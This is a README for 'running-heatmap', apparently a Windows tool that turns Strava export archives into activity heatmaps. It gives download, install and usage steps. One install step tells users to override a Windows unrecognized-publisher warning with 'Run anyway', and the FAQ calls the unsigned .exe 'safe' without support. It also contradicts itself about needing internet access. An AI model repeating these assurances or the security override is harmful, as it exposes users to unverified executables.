# 📍 running-heatmap - Visualize your run data with heatmaps

[![Download running-heatmap](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/hannibalundulate17/running-heatmap/releases)

This application creates visual maps from your Strava exercise data. You can see your activity frequency, running pace, heart rate, and elevation changes represented as a heatmap. Use this to track your progress and identify your favorite running routes over time.

## 📥 How to download the application

The latest version of this tool is available on the releases page. 

[Visit this page to download the software](https://github.com/hannibalundulate17/running-heatmap/releases)

Look for the file ending in `.exe` under the Assets section of the most recent release. Click the file name to start the download.

## 🧭 System requirements

Your computer must meet these requirements to run the application:

* Operating System: Windows 10 or Windows 11.
* Memory: 4GB of RAM or more.
* Storage: 200MB of free disk space.
* Internet Connection: Required to download data from Strava.

## 🛠️ Installation steps

Follow these numbered steps to prepare the application on your computer:

1. Locate the downloaded file in your browser's download folder.
2. Double-click the file to start the setup process.
3. Windows may show a security window. Click "More info" and then "Run anyway" if the system identifies the publisher as unrecognized.
4. Follow the prompts on the screen to finish the installation.
5. Create a shortcut on your desktop for quick access.

## 🏃 Getting your data from Strava

The program requires a data file from your Strava account. You must export this data first:

1. Log in to your Strava account in a web browser.
2. Click your profile picture in the top right corner.
3. Select Settings.
4. Click My Account on the left menu.
5. Scroll to the Data Export section.
6. Click Request Your Archive.
7. Strava sends an email with a download link within a few hours.
8. Download the zip file provided in the email and extract the contents to a folder on your computer.

## 🗺️ Creating your first heatmap

After installing the program and preparing your data, follow these steps to create a map:

1. Open the running-heatmap application.
2. Select the folder where you saved your extracted Strava data.
3. Choose the metric you want to visualize from the settings menu. You can select frequency, pace, heart rate, or gradient.
4. Adjust the date range if you only want to view data from a specific time period.
5. Click the Generate Map button.
6. The app renders a visual map based on your choices. 
7. Use the Save button to export your finished map as an image file.

## 🔍 Troubleshooting common issues

If you encounter problems, follow these solutions:

* Application does not open: Ensure you have the latest updates for your Windows system.
* Data not loading: Verify that the folder you selected contains the activities.csv file from your Strava export.
* Map appears blank: Check if the date range you selected contains activity records.
* Performance issues: If the app runs slowly, close other programs before generating the map.

## 💡 How this tool processes data

The application reads the coordinate data, timestamps, and sensor readings stored within your Strava records. It transforms these numbers into a grid of color-coded intensity. Higher intensity areas appear in brighter colors. The tool saves all generated images to a folder named "Heatmaps" located within your documents folder. Your personal data remains on your local machine and the application does not upload your records to any third-party server.

## 📋 Features

* Interactive Map Layers: Toggle between different metrics to analyze your runs.
* Custom Color Palettes: Choose colors that make your data easy to read.
* Batch Export: Process hundreds of runs at once for a comprehensive overview of your training history.
* Resolution Control: Increase the image quality for printing or high-resolution displays.
* Privacy Masking: Hide the start and end points of your runs to protect your home location.

## 💬 Frequently asked questions

Do I need to be a developer to use this?
No. This application requires no coding skills.

Does the tool connect to my Strava account live?
No. It only imports the files you provide from your manual data archive.

Can I map other activities like cycling?
Yes. The tool processes any GPS data found in your Strava export files, including cycling and hiking records.

Is the software safe?
Yes. It runs entirely on your local computer. It does not send information over the internet.

What format are the saved images?
The app saves images in the common PNG format, which you can open with any photo viewer.